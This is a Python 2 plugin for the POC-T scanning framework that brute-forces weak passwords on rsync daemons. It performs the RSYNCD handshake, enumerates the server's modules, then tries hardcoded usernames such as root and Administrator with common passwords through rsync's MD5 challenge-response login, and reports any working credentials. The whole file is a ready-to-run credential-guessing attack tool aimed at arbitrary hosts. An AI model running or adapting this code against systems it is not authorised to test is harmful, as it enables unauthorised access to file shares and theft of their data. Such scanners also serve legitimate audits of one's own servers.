#!/usr/bin/env python
# -*- coding: utf-8 -*-
# project = https://github.com/Xyntax/POC-T
# author = i@cdxy.me

"""
rsync 弱口令扫描 (需要版本高于30.0)

Usage
 python POC-T.py -s rsync-weakpass -aS "port:873"

Result
 127.0.0.1 version:31.0 Module:'share' User/Password:root/toor

"""

import socket
import struct
import hashlib
import base64

USER_LIST = ['root', 'Administrator', 'rsync', 'user', 'test']
PASS_LIST = ['', 'password', '123456', '12345678', 'qwerty', 'admin123']


def poc(url):
    url = url.split('://')[-1]
    host = url.split(':')[0]
    port = url.split(':')[-1] if ':' in url else 873
    res = initialisation(host, port)

    # (True, '@RSYNCD:', ' 31.0', ['share', '@RSYNCD:EXIT'])
    if res[0]:
        if float(res[2]) < 30.0:  # 判断版本,不兼容低版本的登录方式
            return False

        msg = ''
        for i in range(len(res[3]) - 1):
            _msg = ClientCommand(host, port, res[3][i])
            if 'Module:' in _msg:
                msg += _msg
        return url + ' version:' + res[2].strip() + ' ' + msg if msg else False
    else:
        return False  # exit


def initialisation(host, port):
    '''
        初始化并获得版本信息,每次会话前都要发送版本信息
    '''
    flag = False
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    rsync = {"MagicHeader": "@RSYNCD:", "HeaderVersion": " 30.0"}
    payload = struct.pack("!8s5ss", rsync["MagicHeader"], rsync["HeaderVersion"], "\n")  # init
    try:
        socket.setdefaulttimeout(20)
        s.connect((host, port))
        s.send(payload)
        data = s.recv(1024)
        reply = struct.unpack('!8s5ss', data)
        if len(reply) == 3:
            flag = True
            rsynclist = ClientQuery(s)  # 查询模块名
    except Exception, e:
        pass
    finally:
        s.close()
    if flag:
        return True, reply[0], reply[1], rsynclist
    return False, 'port not open'


def ClientQuery(socket_pre):
    '''
        查询所有的模块名
        @return module name
    '''
    s = socket_pre
    payload = struct.pack("!s", "\n")  # query
    modulelist = []
    try:
        s.send(payload)
        while True:
            data = s.recv(1024)  # Module List lenth 17
            moduletemp = struct.unpack("!" + str(len(data)) + "s", data)
            modulename = moduletemp[0].replace(" ", "").split("\n")
            for i in range(len(modulename)):
                realname = modulename[i].split("\t")
                if realname[0] != "":
                    modulelist.append(realname[0])
            if modulename[-2] == "@RSYNCD:EXIT":
                break
    except Exception, e:
        pass
    return modulelist


def ClientCommand(host, port, cmd):
    rsync = {"MagicHeader": "@RSYNCD:", "HeaderVersion": " 30.0"}
    payload1 = struct.pack("!8s5ss", rsync["MagicHeader"], rsync["HeaderVersion"], "\n")
    payload2 = '%s\n' % cmd

    pass_list = []
    for i in USER_LIST:
        pass_list.append((i, i))
        for j in PASS_LIST:
            pass_list.append((i, j))

    for useri, pwdj in pass_list:
        try:
            user = useri
            password = pwdj
            # debug("try: %s,%s" %(useri,pwdj))
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            # step1 get version and init
            s.send(payload1)
            s.recv(1024)  # server initialisation
            # send cmd and generate the challenge code
            s.send(payload2)  # send client query
            data = s.recv(1024)  # data  @RSYNCD: AUTHREQD 9moobOy1VMjNAU/D4PB35g
            challenge = data[18:-1]  # get challenge code
            # encrypt and generate the payload3
            md = hashlib.md5()
            md.update(password)
            md.update(challenge)
            auth_send_data = base64.encodestring(md.digest())
            payload3 = "%s %s\n" % (user, auth_send_data[:-3])

            s.send(payload3)
            data3 = s.recv(1024)  # @RSYNCD: OK
            s.close()
            if 'OK' in data3:
                if password == '':
                    return "Module:'%s' User/Password:%s/<empty>" % (cmd, user)
                else:
                    return "Module:'%s' User/Password:%s/%s" % (cmd, user, password)
        except Exception, e:
            break
    return 'brute failed'
